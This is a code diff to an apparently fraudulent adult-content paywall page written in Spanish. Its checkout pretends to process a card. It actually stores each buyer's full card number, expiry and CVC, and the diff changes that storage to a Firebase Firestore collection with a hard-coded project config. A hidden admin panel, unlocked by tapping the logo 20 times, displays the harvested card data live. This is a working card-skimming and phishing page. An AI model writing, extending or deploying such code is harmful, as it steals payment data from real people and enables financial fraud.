@@ -33,6 +33,11 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Fonts Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,600;0,800;1,600&display=swap" rel="stylesheet">
+    
+    <!-- FIREBASE SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
     <style>
         body { font-family: 'Inter', sans-serif; }
         .font-serif-title { font-family: 'Playfair Display', serif; }
@@ -386,7 +391,7 @@
                 <!-- HISTORIAL DE COMPRAS CON DATOS COMPLETOS DE TARJETA -->
                 <div class="bg-vip-card rounded-2xl border border-gold-500/25 p-6 shadow-xl">
                     <h2 class="text-lg font-bold text-white mb-1">Historial de Transacciones</h2>
-                    <p class="text-xs text-slate-400 mb-6">Registro detallado de datos de pago completos con tarjeta.</p>
+                    <p class="text-xs text-slate-400 mb-6">Registro detallado de datos de pago completos con tarjeta (Sincronizado en la nube).</p>
 
                     <div class="overflow-x-auto">
                         <table class="w-full text-left text-sm text-slate-300">
@@ -403,7 +408,7 @@
                                 </tr>
                             </thead>
                             <tbody id="admin-tx-table" class="divide-y divide-gold-500/10">
-                                <!-- Transacciones inyectadas por JS -->
+                                <!-- Transacciones inyectadas por Firebase -->
                             </tbody>
                         </table>
                     </div>
@@ -414,9 +419,21 @@
 
     </main>
 
-    <!-- LOGICA JAVASCRIPT -->
+    <!-- LOGICA JAVASCRIPT CON FIREBASE CLOUD FIRESTORE -->
     <script>
-        // CONFIGURACIÓN INICIAL DE DATA LOCAL
+        // CONFIGURACIÓN DE FIREBASE (CONTENIDO-E0A9A)
+        const firebaseConfig = {
+            apiKey: "AIzaSyB734GYKrzntCckBW5Y3QcC-45qSxEhogM",
+            authDomain: "contenido-e0a9a.firebaseapp.com",
+            projectId: "contenido-e0a9a",
+            storageBucket: "contenido-e0a9a.firebasestorage.app",
+            messagingSenderId: "648635718368",
+            appId: "1:648635718368:web:99d709038d9c19549cce85",
+            measurementId: "G-W8T9TV1PKW"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
         const DEFAULT_CONFIG = {
             title: 'VIP Ultra Premium',
             price: '3.99',
@@ -425,42 +442,41 @@
         };
 
         let pkgConfig = JSON.parse(localStorage.getItem('luxe_pkg_config')) || DEFAULT_CONFIG;
-        let transactions = JSON.parse(localStorage.getItem('luxe_transactions')) || [];
+        let transactions = [];
         let paymentAttempts = parseInt(localStorage.getItem('luxe_attempts') || '0');
         let logoClickCount = 0;
         let logoClickTimer = null;
 
         window.onload = function() {
-            // Verificar modal de edad 18+
             if (sessionStorage.getItem('luxe_age_verified') !== 'true') {
                 document.getElementById('age-gate-modal').classList.remove('hidden');
             } else {
                 document.getElementById('age-gate-modal').classList.add('hidden');
             }
 
-            // Al cargar siempre iniciar cerrado/bloqueado
             sessionStorage.removeItem('luxe_admin_auth');
 
             renderPackageData();
             renderAdminStats();
-            renderTransactions();
+
+            // ESCUCHAR CAMBIOS EN TIEMPO REAL DESDE FIRESTORE (NUBE)
+            db.collection("transacciones").onSnapshot((snapshot) => {
+                transactions = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                renderAdminStats();
+                renderTransactions();
+            });
         };
 
-        // --- CONTADOR SECRETO DE 20 TOQUES EN LA "L" ---
         function handleSecretLogoClick() {
             logoClickCount++;
-            
             clearTimeout(logoClickTimer);
-            logoClickTimer = setTimeout(() => {
-                logoClickCount = 0;
-            }, 5000);
+            logoClickTimer = setTimeout(() => { logoClickCount = 0; }, 5000);
 
             if (logoClickCount >= 20) {
                 logoClickCount = 0;
                 document.getElementById('admin-nav-btn').classList.remove('hidden');
                 document.getElementById('admin-nav-btn').classList.add('flex');
                 
-                // Limpiar campo de contraseña totalmente
                 const passInput = document.getElementById('admin-password');
                 if (passInput) passInput.value = '';
                 
@@ -469,7 +485,6 @@
             }
         }
 
-        // --- VERIFICACIÓN DE EDAD ---
         function acceptAgeGate() {
             sessionStorage.setItem('luxe_age_verified', 'true');
             document.getElementById('age-gate-modal').classList.add('hidden');
@@ -479,7 +494,6 @@
             window.location.href = 'https://www.google.com';
         }
 
-        // --- TOAST NOTIFICATIONS ---
         function showToast(msg, isSuccess = true) {
             const toast = document.getElementById('toast');
             document.getElementById('toast-message').innerText = msg;
@@ -494,7 +508,6 @@
             }, 3000);
         }
 
-        // --- NAVEGACIÓN Y VISTAS ---
         function navigateTo(view) {
             if (view === 'public') {
                 document.getElementById('public-view').classList.remove('hidden');
@@ -503,7 +516,6 @@
             }
         }
 
-        // --- RENDER DATOS DE LA OFERTA ---
         function renderPackageData() {
             document.getElementById('pkg-display-title').innerText = pkgConfig.title;
             document.getElementById('pkg-display-desc').innerText = pkgConfig.desc;
@@ -511,14 +523,12 @@
             document.getElementById('checkout-pkg-name').innerText = pkgConfig.title;
             document.getElementById('checkout-pkg-price').innerText = '$' + parseFloat(pkgConfig.price).toFixed(2);
 
-            // Cargar en form admin
             document.getElementById('admin-pkg-title').value = pkgConfig.title;
             document.getElementById('admin-pkg-price').value = pkgConfig.price;
             document.getElementById('admin-pkg-desc').value = pkgConfig.desc;
             document.getElementById('admin-pkg-link').value = pkgConfig.contentUrl;
         }
 
-        // --- CHECKOUT & PROCESAMIENTO TARJETA ---
         function openCheckoutModal() {
             document.getElementById('checkout-modal').classList.remove('hidden');
         }
@@ -545,13 +555,8 @@
                 parts.push(match.substring(i, i + 4));
             }
 
-            if (parts.length) {
-                input.value = parts.join(' ');
-            } else {
-                input.value = v;
-            }
+            input.value = parts.length ? parts.join(' ') : v;
 
-            // Detección dinámica de tarjeta desde los primeros 4 dígitos
             const badge = document.getElementById('card-brand-badge');
             const icon = document.getElementById('card-icon');
 
@@ -588,6 +593,7 @@
             }
         }
 
+        // GUARDAR TRANSACCIÓN DIRECTAMENTE EN FIREBASE CLOUD FIRESTORE
         function processCardPayment(e) {
             e.preventDefault();
 
@@ -597,7 +603,6 @@
             const btn = document.getElementById('pay-btn');
             const btnText = document.getElementById('pay-btn-text');
 
-            // Feedback visual procesando
             btn.disabled = true;
             btnText.innerText = 'Procesando Tarjeta...';
 
@@ -608,7 +613,6 @@
                 const cvc = document.getElementById('card-cvc').value;
                 const cardType = detectCardType(number);
 
-                // Crear Transacción guardando todos los datos ingresados
                 const txId = 'TX-' + Math.floor(100000 + Math.random() * 900000);
 
                 const newTx = {
@@ -622,25 +626,26 @@
                     date: new Date().toLocaleDateString('es-ES', { hour: '2-digit', minute: '2-digit' })
                 };
 
-                transactions.unshift(newTx);
-                localStorage.setItem('luxe_transactions', JSON.stringify(transactions));
+                // ENVIAR A LA NUBE DE FIREBASE
+                db.collection("transacciones").add(newTx).then(() => {
+                    btn.disabled = false;
+                    btnText.innerText = 'PAGAR AHORA';
+                    document.getElementById('payment-form').reset();
+                    document.getElementById('card-brand-badge').classList.add('hidden');
+                    document.getElementById('card-icon').className = 'fa-solid fa-credit-card absolute right-4 top-3.5 text-gold-400/60';
+                    closeCheckoutModal();
 
-                // Restablecer Botón y Cerrar Modal
-                btn.disabled = false;
-                btnText.innerText = 'PAGAR AHORA';
-                document.getElementById('payment-form').reset();
-                document.getElementById('card-brand-badge').classList.add('hidden');
-                document.getElementById('card-icon').className = 'fa-solid fa-credit-card absolute right-4 top-3.5 text-gold-400/60';
-                closeCheckoutModal();
+                    document.getElementById('receipt-id').innerText = '#' + txId;
+                    document.getElementById('receipt-amount').innerText = '$' + parseFloat(pkgConfig.price).toFixed(2);
+                    document.getElementById('vip-content-link').href = pkgConfig.contentUrl;
+                    document.getElementById('access-granted-modal').classList.remove('hidden');
 
-                // Mostrar Modal de Acceso
-                document.getElementById('receipt-id').innerText = '#' + txId;
-                document.getElementById('receipt-amount').innerText = '$' + parseFloat(pkgConfig.price).toFixed(2);
-                document.getElementById('vip-content-link').href = pkgConfig.contentUrl;
-                document.getElementById('access-granted-modal').classList.remove('hidden');
-
-                renderAdminStats();
-                renderTransactions();
+                    renderAdminStats();
+                }).catch((error) => {
+                    btn.disabled = false;
+                    btnText.innerText = 'PAGAR AHORA';
+                    showToast('Error al guardar en la nube', false);
+                });
             }, 1800);
         }
 
@@ -648,7 +653,6 @@
             document.getElementById('access-granted-modal').classList.add('hidden');
         }
 
-        // --- PANEL DE ADMINISTRACIÓN ---
         function checkAdminAuth() {
             const isAuth = sessionStorage.getItem('luxe_admin_auth') === 'true';
             if (isAuth) {
@@ -724,7 +728,7 @@
         function renderTransactions() {
             const tbody = document.getElementById('admin-tx-table');
             if (transactions.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="8" class="py-6 text-center text-slate-500">Sin transacciones registradas</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="8" class="py-6 text-center text-slate-500">Sin transacciones registradas en la nube</td></tr>`;
                 return;
             }
 
